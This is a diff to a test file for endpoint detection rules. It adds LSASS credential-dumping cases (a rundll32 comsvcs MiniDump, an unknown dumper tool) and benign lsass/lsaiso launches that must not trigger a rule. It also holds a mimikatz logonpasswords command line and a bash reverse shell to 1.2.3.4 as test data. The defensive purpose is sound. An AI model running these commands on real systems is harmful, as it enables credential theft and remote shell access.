@@ -309,6 +309,14 @@ def test_every_bundled_rule_documents_false_positives(bundled):
     ("credential dumping",
      proc("mimikatz.exe", r"C:\T\mimikatz.exe", "mimikatz sekurlsa::logonpasswords"),
      "T1003.001"),
+    # Excusing lsass.exe itself must not excuse anything else touching it.
+    ("an unknown tool dumping lsass",
+     proc("dumper.exe", r"C:\Users\x\dumper.exe", "dumper.exe -p lsass -o out.dmp"),
+     "T1003.001"),
+    ("comsvcs minidump of lsass",
+     proc("rundll32.exe", r"C:\W\rundll32.exe",
+          "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 1360 out.dmp full"),
+     "T1003.001"),
     ("reverse shell",
      proc("bash", "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"),
      "T1059"),
@@ -336,6 +344,15 @@ def test_bundled_rules_detect_known_attacks(bundled, label, event, expect_techni
           "powershell -enc AAAA Get-WinEvent -LogName System")),
     ("explorer launching notepad",
      proc("notepad.exe", r"C:\W\notepad.exe", "notepad.exe a.txt", parent="explorer.exe")),
+    # LSASS is what credential theft steals *from*. Windows starts it on every
+    # boot, and its own command line contains its own name, so a rule hunting
+    # for something dumping lsass must not flag lsass itself.
+    ("windows starting its own lsass",
+     proc("lsass.exe", r"C:\Windows\system32\lsass.exe",
+          r"C:\Windows\system32\lsass.exe", parent="wininit.exe")),
+    ("credential guard isolated lsa",
+     proc("lsaiso.exe", r"C:\Windows\system32\lsaiso.exe",
+          r"C:\Windows\system32\lsaiso.exe", parent="wininit.exe")),
     ("https to a cdn", net("chrome.exe", "142.250.0.1", 443)),
     ("dns lookup", net("svchost.exe", "1.1.1.1", 53)),
     ("ssh to a server", net("ssh.exe", "10.0.0.5", 22)),
